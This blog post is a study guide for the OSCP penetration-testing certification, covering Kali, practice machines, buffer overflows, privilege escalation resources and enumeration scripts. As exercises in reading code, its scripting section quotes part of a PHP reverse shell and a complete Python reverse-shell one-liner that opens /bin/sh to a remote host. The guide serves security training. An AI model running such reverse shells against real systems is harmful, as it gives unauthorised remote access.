---
layout:     post
title:      "From Zero to OSCP"
date:       2020-06-01 00:00:00
author:     J
summary:    Oh
categories: OffSec
thumbnail:  fast-forward
tags:
 - OSCP
 - Zero to
 - PWK
 - Offensive Security
 - OffSec
---

## A foreword



Those who know me personally will know that  I prepared extensively for the PWK course, and consequently the OSCP exam. And one common question from my peers is "How do I go about preparing for the OSCP? Where do I start?". If you look on the internet, there are several good guides on how to go about doing it, but here I am, adding to another of that list of guides.



This guide will be primarily for those who have some limited(minimal is fine, but not zero) experience in the following domains:

1. Web applications
2. The linux command line(and some windows)
3. Some networking basics
4. Eh, that's all really



There are a ton of prerequisites that everyone says to have which you may not possess, but let's face it. You want that certificate, your employer wants that certificate, your future employers want that certificate. Regardless of whether you have the entire checklist or not, you want to do it, and you want to know the most efficient way to do it.



During the course of my preparation for the OSCE, I came across some immensely useful guides/study plan thingies which would speed up my progress significantly. So with that inspiration in mind, I will pen down my thoughts and ideas here on how to prepare for the OSCP. Working **hard** is one thing, but if you have a direction, you can work **smart**.



I don't want to dump 50 links on you for reading, with each of them having their own 5 links each and make you end up lost in the sea of information. Neither do I want to recommend you 5 extremely wonderfully written books on hacking and exploitation with each being 300-600 pages long. You'll get to that stage eventually, but it's not absolutely required if you just want to pass that dreaded 24 hour exam, amazing as those resources are.



Ff you just want to prepare yourself sufficiently for the OSCP, this guide is for you. Do note that this will **NOT** make you a good penetration tester. Many real world scenarios and test cases performed in a penetration test are not tested in the exam. The OSCP is a **beginner** certification(albeit a difficult one) which teaches you the basic methodology and mindset of a hacker.



That being said, if you want to be truly good at it, and not just a walking certificate, then do make it a point to read through the ton of resources and books available on the internet.

---



## 1. Knowing your weapons



### 1.1 The Kali Linux Operating System



Firstly, this OS will be your bread and butter, it comes with a boatload of tools, 95% of which you will not use. You will be provided with a prebuilt VM specially created and guaranteed to work with the course and exams. But for preparation, you may use the latest and greatest versions of this system.



If you're familiar with other flavours of Linux, feel free to use them, and install each of the individual tools you need on it. But for the rest of us who prefer a plug-and-play style, just install Kali.



### 1.2 The command line



That black screen with white(or green) words. Get used to using it; while some people like fancy GUIs, I am an advocate of being at home on a terminal. If you can reduce time spent clicking around with a mouse and move around using only your keyboard, you'll save quite a bit of time.



What you need to know:

1. **Moving around, manipulating files and directories in linux and windows**(cd, ls, dir, mkdir, rm, cp, cat etc) - This should take you less than an hour max. I'd even go as far as to say 10 minutes. If you can't remember them all, don't worry. Over time as you use them, you will remember.
2. **Editing files** - I personally use Nano because it's the closest to a basic notepad. You can use Vi or Vim if you want to look more pro, but to hell with that. With Nano all you need is `ctrl + x` to exit, then press `y` to save.




### 1.2 Tools



Most of the tools you'll require are already installed on Kali. Cheers :)



### 1.3 Scripting



You do not require any coding knowledge prior to starting the course. Understanding Python is an advantage, but not needed. However, you will need to have the basic logical ability to decipher a piece of code and make minor changes accordingly.



By basic I mean this:

~~~php
# a few lines from pentestmonkey's php reverse shell

set_time_limit (0);
$VERSION = "1.0";
$ip = '127.0.0.1';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
~~~

How do you think you can change the IP address and port number you want the reverse shell to connect back to? 



~~~bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
~~~

What about this one?



Yes that sort of basic. Some are harder than this but it's not too far off.



### 1.4 Resources



I haven't really studied this much as I came into it with some experience, but I'm told this is a good resource:

[Overthewire: Bandit][1]

---

## 2. The Game Plan



The scope of the PWK course is extremely vast, everything including the kitchen sink is being thrown at you. You have to know a little bit of everything to start off.  To learn something, you need to see how it's done. While it can be extremely helpful to read and dive into the technicalities of how each exploitation technique works, you need to prioritise expanding your breadth of knowledge as wide as possible. In order to cut a hole through a wall, you must first be able to make a small crack in it.



A lot of people may disagree with this approach, but it's still a valid strategy. My reasoning for this is that during your adventures into the world of hacking, with this approach you should be able to make at least a bit of leeway into different attack vectors. If you get stuck, at least you will be able to research more on the topic.



It's basically depth before breadth, vs breadth before depth:

1. You focus so deeply on something, for example web application exploitation. You run your port scan and 10 ports show up. 2 of these open ports are web applications. Try as you might, you can't find anything to leverage on in them, now what? You google for how to exploit each and every port.
2. You have a rough idea of what techniques can be used on each port. **21** is open? Let's try anonymous login. **80**? Gotcha, `dirbuster`, `gobuster`, or `nikto`. You find a field that I know is vulnerable to SQL injection, but can't seem to get it right.  But at least you have something to work with and know what to Google for.



### 2.1 Watch and Learn



The folks at NetSecFocus have created a very nice curated [list of HackTheBox and Vulnhub machines][3] which are said to be "OSCP-like". Go through the list of them and search on YouTube for [Ippsec][2]'s walkthrough video on each machine, watch and take notes.

If you able to purchase a [HackTheBox ][4]VIP subscription to access those machines, it can be helpful to follow through and replicate what he does. The key here is to understand what he's doing and why.



For the machines from [Vulnhub][5], you can google the walkthroughs for them.



Basically this is it. This in itself will prepare you about 80% or more of the way to the OSCP if you go through most, if not all of the machines listed. If you do not understand  why some things are done, do a quick search or reach out for help. There are quite a few discord and telegram channels out there, as well as subreddits full of aspiring OSCPs who have once asked themselves the same question, and are willing to help.



### 2.2 You call this a guide?! I expected something structured!!@1one@at@



Ok I get it, not everyone is able to absorb tidbits from all over the place at once. I did not go this route, but I did however finish [this][6] course by The Cyber Mentor on Udemy. You will have to pay a small enrollment fee but his contents are top notch.



### 2.3 The PWK lab


At this point you are ready to start the PWK course. Depending on your confidence level, you can opt for 30, 60, or 90 days of labs. 90 is recommended for most. But if you have time to spare every day and are confident of rooting medium difficulty HackTheBox machines on your own, then you will probably get away with less.



From what I gather, a good number to aim for to get a feel of the general process is **18-24** machines, give or take. If you can do that number of boxes with minimal reliance on hints, you probably have a high chance of scoring over **55** points in the exam(**70** is the passing requirement), with a slightly over 60% rate of passing(just throwing an estimate, don't quote me on it)

---

## 3. A little bit on techniques



### 3.1 Buffer Overflows



When going through the course materials, I found that there might be mixed reactions to their BOF section. For some, it can be really good as it covers the technical details fairly well. But for the rest of us, it can be information overload. Yes, even a simple buffer overflow attack can be confusing for a beginner.



Thus I recommend the [Buffer Overflows Made Easy][7] video series by The Cyber Mentor(yes him again). I may make my own written tutorial down the line if people desire it, but I believe the video series I linked are more than sufficient.



### 3.1.1 Buffer Overflow additional Resources

You will need to set up your own vulnerable Windows virtual machine. I won't be able to help you here, but these are what I shared with my peers when teaching them basic buffer overflows. In addition, you will need to download [Immunity Debugger][8] with the Mona modules.



Then download the following onto the machine and let it rip:

1. [Vulnserver][9]

2. [Brainpan: 1][11] (It comes as a VM, but you can just extract the `.exe` file and transfer it to your own machine)

3. [Dostackbufferoverflowgood][11]



Ideally, you will want to practice to the point you can get a reverse shell on each of them in under 15 minutes. But if you can't, about 30-40 minutes will still suffice. Take note that the exam may possibly contain a harder BOF, so the key here is to get it done as quickly as possible so you'll have more time for other machines during the exam.



### 3.2 Privilege Escalation

Don't have to read all, pick your favourite guide and stick to that. They all mostly contain the same information but just have different way of presenting and explaining concepts.



Linux

https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/

More good ones but this is known to many as the "bible" of linux privesc



Windows

https://www.fuzzysecurity.com/tutorials/16.html

https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html

https://guif.re/windowseop



Other:

https://recipeforroot.com



### 3.3 Google-Fu



Googling is a skill, knowing where to find the information you want is a must. From learning new things, to searching for exploits. For this section, I will just say that you will likely find your exploit scripts required mostly on exploit-db or github.

---

## 4. On efficiency

### 4.1 Multiple Terminals

I sometimes see people with 4 or more separate terminal windows open, and having to figure out "oh which one is my reverse shell on?". It can be quite annoying to deal with that.



2 of my recommended ways to deal with this are:

1. Tmux - I personally use this, tab/window switching is fast as you can use hotkeys. In addition, you can name each tab/window so you can quickly identify which window is doing what. The ability to split a terminal is also useful if you want to multitask and see multiple things at once.
2. Tabbed Terminals - Just like modern web browsers, you can actually run multiple tabs within the same terminal window using `ctrl + shift + t`



There are a lot more fanciful ways to navigate around the windows within the OS but I haven't really experimented with those yet, and hence will not comment on them.



###  4.2 Scripting and Automation



I know that some people who believe in full manual scanning. Manually typing the `nmap` command, then doing extra stuff like `gobuster`, `nikto` and whatnot manually. The common argument is that "to be a good hacker, you need to know each of your tools well, understand what each flag does etc.



While there is some truth in that, I don't believe in it fully. I personally have my own "cheatsheet" of commands for each tool I use for my exploitations and privilege escalation attempts, and can easily perform everything manually with copy and pasting commands, and so should you. A sample of a cheatsheet by xapax can be found [here][12]. Credits go to the author for sharing this on his github page.



Since you pretty much know the flow of commands and what tools to use for each open port, and also the list of commands you are going to be using to perform privilege escalation, why not script it so it comes out in a nice pretty format while you go get a cuppa coffee?



Enumeration:

[nmapAutomator][13] by 21y4d - I personally like this the most because there are less output files

[AutoRecon][14] by Tib3rius - This is said to be the most popular at the moment

Privilege Escalation

[lse.sh][15] by diego treitos - This is my favourite, I personally always use it with the `-l1` flag for more verbosity.

[LinEnum][16] by rebootuser - Another good one, made popular by Ippsec. But I think it's too much information.

[Privilege Escalation Awesome Script Suite][17] (linPEAS and winPEAS) by carlospolop - I loved winPEAS, and expect linPEAS to be equally great, but have not used it extensively





Till next time!

J



---

Changelog:



v 1.1 - 02/06/2020 - Add links for more stuff

v 1.0 - 01/06/2020 - First draft



[1]: https://overthewire.org/wargames/bandit/
[2]: https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA
[3]: https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit#gid=1839402159
[4]: https://www.hackthebox.eu
[5]: https:/www.vulnhub.com
[6]: https://www.udemy.com/course/practical-ethical-hacking/learn/
[7]: https://www.youtube.com/watch?v=qSnPayW6F7U&amp;list=PLLKT__MCUeix3O0DPbmuaRuR_4Hxo4m3G
[8]: https://www.immunityinc.com/products/debugger/
[9]: http://www.thegreycorner.com/2010/12/introducing-vulnserver.html
[10]: https://www.vulnhub.com/entry/brainpan-1,51/
[11]: https://github.com/justinsteven/dostackbufferoverflowgood
[12]: https://github.com/xapax/oscp/blob/master/templates/linux-template.md
[13]: https://github.com/21y4d/nmapAutomator
[14]: https://github.com/Tib3rius/AutoRecon
[15]: https://github.com/diego-treitos/linux-smart-enumeration
[16]: https://github.com/rebootuser/LinEnum
[17]: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite
